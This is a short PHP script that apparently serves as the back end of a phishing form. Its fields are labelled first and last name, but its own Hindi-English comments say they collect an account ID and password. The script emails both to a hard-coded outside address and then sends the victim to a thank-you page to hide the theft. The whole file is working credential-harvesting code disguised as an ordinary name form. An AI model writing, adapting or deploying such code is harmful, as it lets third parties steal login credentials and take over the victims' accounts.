<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $first_name = $_POST['first_name'];
    $last_name = $_POST['last_name'];

    // Do something with the data, such as store it in a database or send it via email
    // For example, sending an email
    $to = "ssp105@outlook.com";
    $subject = "Aise milega tujhe password?";
    $message = "First Name matlab yaha id ka naam: $first_name\nLast Name matlab yaha id ka password use karunga: $last_name";
    $headers = "From: adibakahai@gmail.com";

    mail($to, $subject, $message, $headers);

    // Redirect user to a thank you page
    header("Location: thank_you.html");
    exit();
}
?>
